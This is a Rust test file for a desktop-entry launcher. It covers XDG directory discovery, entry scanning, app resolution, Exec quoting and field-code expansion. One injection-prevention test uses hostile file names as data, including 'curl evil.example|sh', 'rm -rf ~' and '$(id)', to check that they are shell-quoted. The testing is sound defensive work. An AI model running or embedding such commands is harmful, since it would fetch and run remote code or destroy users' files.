//! Desktop entries: which are installed, which one `app` names, and their command lines.

use std::path::{Path, PathBuf};

use super::super::entries::*;
use super::write;
use crate::desktop::tests::bus::temp_dir;

fn dirs(root: &Path) -> Dirs {
    Dirs {
        home: root.join("home"),
        data_home: root.join("data"),
        data_dirs: vec![root.join("sys")],
        config_home: root.join("config"),
        config_dirs: vec![],
        desktops: vec!["KDE".into()],
        langs: vec!["de_DE".into(), "de".into()],
        path: std::env::var("PATH").unwrap_or_default(),
    }
}

fn entry(root: &Path, dir: &str, id: &str, body: &str) {
    write(
        &root
            .join(dir)
            .join("applications")
            .join(format!("{id}.desktop")),
        &format!("[Desktop Entry]\nType=Application\n{body}\n"),
    );
}

#[test]
fn the_environment_names_the_directories_and_the_language() {
    let env = [
        ("HOME", "/h"),
        ("XDG_DATA_DIRS", "/a:relative:/b"),
        ("XDG_CONFIG_HOME", "relative"),
        ("XDG_CURRENT_DESKTOP", "KDE:Plasma"),
        ("LANG", "de_DE.UTF-8@euro"),
    ];
    let d = Dirs::from_env(|k| {
        env.iter()
            .find(|(n, _)| *n == k)
            .map(|(_, v)| v.to_string())
    });
    assert_eq!(d.data_home, PathBuf::from("/h/.local/share"));
    assert_eq!(d.data_dirs, [PathBuf::from("/a"), PathBuf::from("/b")]);
    assert_eq!(
        d.config_home,
        PathBuf::from("/h/.config"),
        "relative is ignored"
    );
    assert_eq!(d.config_dirs, [PathBuf::from("/etc/xdg")]);
    assert_eq!(d.desktops, ["KDE", "Plasma"]);
    assert_eq!(d.langs, ["de_DE@euro", "de_DE", "de@euro", "de"]);
    let none = Dirs::from_env(|_| None);
    assert_eq!(
        none.data_dirs,
        [
            PathBuf::from("/usr/local/share"),
            PathBuf::from("/usr/share")
        ]
    );
    assert!(none.langs.is_empty());
}

/// The spec's rules for what is installed: the user's directory before the system's, `Hidden`
/// hides an id there, other desktops' and non-applications are left out, a missing `TryExec`
/// too, and a subdirectory's file is `<dir>-<name>`.
#[test]
fn installed_applications_follow_the_spec() {
    let t = temp_dir();
    let r = t.path();
    entry(r, "sys", "org.kde.kate", "Name=Kate\nExec=kate %U");
    entry(
        r,
        "data",
        "org.kde.kate",
        "Name=My Kate\nExec=kate --mine %U",
    );
    entry(r, "sys", "gone", "Name=Gone\nExec=true");
    entry(r, "data", "gone", "Hidden=true");
    entry(
        r,
        "sys",
        "gnomeonly",
        "Name=G\nExec=true\nOnlyShowIn=GNOME;",
    );
    entry(r, "sys", "notkde", "Name=N\nExec=true\nNotShowIn=KDE;");
    entry(
        r,
        "sys",
        "kdeonly",
        "Name=K\nExec=true\nOnlyShowIn=XFCE;KDE;",
    );
    entry(
        r,
        "sys",
        "missing",
        "Name=M\nExec=true\nTryExec=kai-no-such-program-x",
    );
    entry(r, "sys", "noexec", "Name=X");
    write(
        &r.join("sys/applications/link.desktop"),
        "[Desktop Entry]\nType=Link\nName=L\nURL=https://x\n",
    );
    entry(r, "sys", "vendor/sub", "Name=Sub\nExec=true");
    let apps = scan(&dirs(r));
    let ids: Vec<&str> = apps.iter().map(|e| e.id.as_str()).collect();
    assert_eq!(ids, ["org.kde.kate", "kdeonly", "vendor-sub"]);
    assert_eq!(apps[0].name, "My Kate");
}

#[test]
fn names_and_lists_read_as_the_spec_writes_them() {
    let t = temp_dir();
    let r = t.path();
    entry(
        r,
        "sys",
        "org.kde.dolphin",
        "Name=Dolphin\nName[de]=Dolphin-Dateien\nGenericName=File Manager\n\
         GenericName[de]=Dateiverwaltung\nExec=dolphin %u\nIcon=system-file-manager\n\
         MimeType=inode/directory;\nPath=/tmp\\sx\nNoDisplay=false\n# a comment\n\
         [Desktop Action new]\nName=Not this\nExec=nope",
    );
    let apps = scan(&dirs(r));
    let e = &apps[0];
    assert_eq!(e.name, "Dolphin");
    assert_eq!(e.local_name.as_deref(), Some("Dolphin-Dateien"));
    assert_eq!(e.shown_name(), "Dolphin-Dateien");
    assert_eq!(e.generic, ["File Manager", "Dateiverwaltung"]);
    assert_eq!(e.exec, "dolphin %u");
    assert_eq!(e.icon.as_deref(), Some("system-file-manager"));
    assert_eq!(e.mime_types, ["inode/directory"]);
    assert_eq!(e.workdir.as_deref(), Some("/tmp x"));
    assert_eq!(e.program().as_deref(), Some("dolphin"));
    assert_eq!(e.line(), "org.kde.dolphin \"Dolphin-Dateien\"");
}

fn app(id: &str, name: &str, exec: &str) -> Entry {
    Entry {
        id: id.into(),
        name: name.into(),
        exec: exec.into(),
        ..Default::default()
    }
}

/// K22's resolution: the first rule that matches anything decides, an ambiguous one lists the
/// candidates, a miss echoes nothing.
#[test]
fn app_resolves_by_id_name_command_and_fragment() {
    let mut helper = app("org.kde.kate.helper", "Kate", "kate-helper");
    helper.no_display = true;
    let mut writer = app(
        "org.libreoffice.writer",
        "LibreOffice Writer",
        "libreoffice --writer",
    );
    writer.generic = vec!["Word Processor".into()];
    let mut ff = app("firefox", "Firefox", "/usr/lib64/firefox/firefox %u");
    ff.local_name = Some("Firefox-Browser".into());
    ff.generic = vec!["Web Browser".into()];
    let apps = vec![
        app("org.kde.kate", "Kate", "kate %U"),
        helper,
        app("org.kde.dolphin", "Dolphin", "dolphin %u"),
        writer,
        app(
            "org.libreoffice.calc",
            "LibreOffice Calc",
            "libreoffice --calc",
        ),
        ff,
    ];
    let id = |q: &str| resolve(&apps, q).map(|e| e.id.clone());
    assert_eq!(id("org.kde.dolphin.desktop").unwrap(), "org.kde.dolphin");
    assert_eq!(id("ORG.KDE.KATE.HELPER").unwrap(), "org.kde.kate.helper");
    assert_eq!(id("Dolphin").unwrap(), "org.kde.dolphin");
    assert_eq!(
        id("kate").unwrap(),
        "org.kde.kate",
        "the helper is NoDisplay"
    );
    assert_eq!(id("firefox-browser").unwrap(), "firefox");
    assert_eq!(id("writer").unwrap(), "org.libreoffice.writer");
    assert_eq!(id("word processor").unwrap(), "org.libreoffice.writer");
    assert_eq!(id("browser").unwrap(), "firefox");
    let e = id("libreoffice").unwrap_err();
    assert_eq!(
        e,
        "2 applications match; name one by its id:\n\
         org.libreoffice.writer \"LibreOffice Writer\"\n\
         org.libreoffice.calc \"LibreOffice Calc\""
    );
    let miss = id("s3cr3t-app").unwrap_err();
    assert!(!miss.contains("s3cr3t"), "{miss}");
    assert!(id("  ").is_err());
}

#[test]
fn exec_quoting_follows_the_spec() {
    assert_eq!(exec_words("a  b\tc").unwrap(), ["a", "b", "c"]);
    assert_eq!(
        exec_words(r#"sh -c "echo \"hi\" \$HOME \\ \`x\`" x"#).unwrap(),
        ["sh", "-c", r#"echo "hi" $HOME \ `x`"#, "x"]
    );
    assert_eq!(exec_words(r#"a"b c"d"#).unwrap(), ["ab cd"]);
    assert_eq!(exec_words(r#"x """#).unwrap(), ["x", ""]);
    assert!(exec_words(r#"x "open"#).is_err());
    // As GLib splits it: single quotes literal, a backslash outside quotes escapes one character.
    assert_eq!(
        exec_words(r#"a 'b "c" \d' e\ f 'it'\''s'"#).unwrap(),
        ["a", r#"b "c" \d"#, "e f", "it's"]
    );
    assert!(exec_words("x 'open").is_err());
}

/// A value inside a word goes in quoted (GLib's and KIO's way), so a file name cannot add a
/// command to a shell the entry runs: outside quotes the word holds the name itself, inside quotes
/// it holds the name shell-quoted, which that shell reads as one word.
#[test]
fn field_codes_inside_a_word_cannot_inject() {
    let evil = "/d/x;curl evil.example|sh;.mp4";
    let file = |p: &str| [Target::File(p.into())];
    let argv = |exec: &str, p: &str| plan(&app("m", "M", exec), &file(p)).unwrap().argvs[0].clone();
    assert_eq!(
        argv(r#"sh -c "mpv %f""#, evil),
        ["sh", "-c", &format!("mpv {}", shell_quote(evil))]
    );
    assert_eq!(
        argv(r#"sh -c "mpv %f""#, evil)[2],
        "mpv '/d/x;curl evil.example|sh;.mp4'"
    );
    for nasty in [
        "/d/it's;rm -rf ~",
        "/d/a\"$(id)`id`\\\"",
        "/d/'\"'\"",
        "/d/new\nline",
    ] {
        for exec in [
            r#"sh -c "mpv %f""#,
            "sh -c 'mpv %f'",
            r#"sh -c "mpv '%f'""#,
            r#"sh -c 'mpv "%f"'"#,
            r#"sh -c "mpv \"%f\"""#,
            r#"sh -c "mpv x%fy""#,
        ] {
            let a = argv(exec, nasty);
            assert_eq!(a.len(), 3, "{exec} {nasty:?}: {a:?}");
            assert!(a[2].starts_with("mpv "), "{a:?}");
            // The inner shell's own split of the word gives the name back as one word.
            let inner = &a[2]["mpv ".len()..];
            let words = exec_words(inner).unwrap();
            let want = if exec.contains("x%fy") {
                format!("x{nasty}y")
            } else {
                nasty.to_owned()
            };
            assert_eq!(words, [want], "{exec}: {a:?}");
        }
    }
    // Outside quotes, embedded or alone, the word is the name itself.
    assert_eq!(argv("w --file=%f", "/d/a b;c"), ["w", "--file=/d/a b;c"]);
    assert_eq!(argv("w %f", "/d/'q'"), ["w", "/d/'q'"]);
}

#[test]
fn targets_are_urls_with_a_scheme_else_paths_from_home() {
    let home = Path::new("/home/u");
    assert_eq!(
        Target::parse("https://example.com/a b", home, |_| false).unwrap(),
        Target::Url("https://example.com/a%20b".into())
    );
    assert_eq!(
        Target::parse("mailto:a@b.c", home, |s| s == "mailto").unwrap(),
        Target::Url("mailto:a@b.c".into())
    );
    assert_eq!(
        Target::parse("file:///tmp/a%20b.txt", home, |_| false).unwrap(),
        Target::File("/tmp/a b.txt".into())
    );
    assert_eq!(
        Target::parse("~/x.txt", home, |_| false).unwrap(),
        Target::File("/home/u/x.txt".into())
    );
    assert_eq!(
        Target::parse("Documents/x.txt", home, |_| false).unwrap(),
        Target::File("/home/u/Documents/x.txt".into())
    );
    assert_eq!(
        Target::parse("/etc/hosts", home, |_| false).unwrap(),
        Target::File("/etc/hosts".into())
    );
    assert!(Target::parse("", home, |_| false).is_err());
    // A colon in a relative path is no scheme unless the session knows it as one.
    assert_eq!(
        Target::parse("notes:x.txt", home, |_| false).unwrap(),
        Target::File("/home/u/notes:x.txt".into())
    );
    assert_eq!(
        Target::parse("notes:x.txt", home, |s| s == "notes").unwrap(),
        Target::Url("notes:x.txt".into())
    );
    assert_eq!(
        Target::parse("custom://thing", home, |_| false).unwrap(),
        Target::Url("custom://thing".into()),
        "with :// it is a URL"
    );
}

/// The field codes: a list code takes every target, a single one starts one process per target;
/// `%i`, `%c`, `%k` and `%%`; the deprecated codes are dropped; a URL never reaches a `%f`.
#[test]
fn the_field_codes_expand_as_the_spec_says() {
    let mut e = app(
        "org.kde.kate",
        "Kate",
        "kate --icon-was %i -n %c %k 100%% %d %F",
    );
    e.icon = Some("kate".into());
    e.local_name = Some("Kate DE".into());
    e.file = "/apps/kate.desktop".into();
    let files = [
        Target::File("/a b.txt".into()),
        Target::File("/c.txt".into()),
    ];
    let p = plan(&e, &files).unwrap();
    assert_eq!(
        p.argvs,
        [[
            "kate",
            "--icon-was",
            "--icon",
            "kate",
            "-n",
            "Kate DE",
            "/apps/kate.desktop",
            "100%",
            "/a b.txt",
            "/c.txt"
        ]]
    );
    assert!(p.notes.is_empty());
    let single = app("x", "X", "viewer %u");
    let p = plan(
        &single,
        &[
            Target::File("/a b".into()),
            Target::Url("https://x/".into()),
        ],
    )
    .unwrap();
    assert_eq!(
        p.argvs,
        [
            vec!["viewer", "file:///a%20b"],
            vec!["viewer", "https://x/"]
        ]
    );
    let none = app("y", "Y", "game");
    let p = plan(&none, &[Target::File("/a".into())]).unwrap();
    assert_eq!(p.argvs, [["game"]]);
    assert_eq!(p.notes, ["it takes no files or URLs, so none were passed"]);
    let files_only = app("z", "Z", "z %F");
    assert_eq!(
        plan(&files_only, &[Target::Url("https://x/".into())]).unwrap_err(),
        "Z opens local files only, not URLs"
    );
    assert_eq!(plan(&files_only, &[]).unwrap().argvs, [["z"]]);
    let embedded = app("w", "W", "w --open=%u");
    assert_eq!(
        plan(&embedded, &[Target::File("/f".into())]).unwrap().argvs,
        [["w", "--open=file:///f"]]
    );
}

#[test]
fn programs_are_found_as_execvp_finds_them() {
    let t = temp_dir();
    let bin = t.path().join("bin");
    super::script(&bin.join("tool"), "true");
    write(&bin.join("plain"), "not executable");
    let path = format!("/nonexistent:{}", bin.display());
    let home = t.path();
    assert_eq!(find_program("tool", &path, home), Some(bin.join("tool")));
    assert_eq!(find_program("plain", &path, home), None);
    assert_eq!(find_program("nope", &path, home), None);
    assert_eq!(
        find_program(&bin.join("tool").display().to_string(), "", home),
        Some(bin.join("tool"))
    );
    assert_eq!(find_program("~/bin/tool", "", home), Some(bin.join("tool")));
    assert_eq!(find_program("", &path, home), None);
}
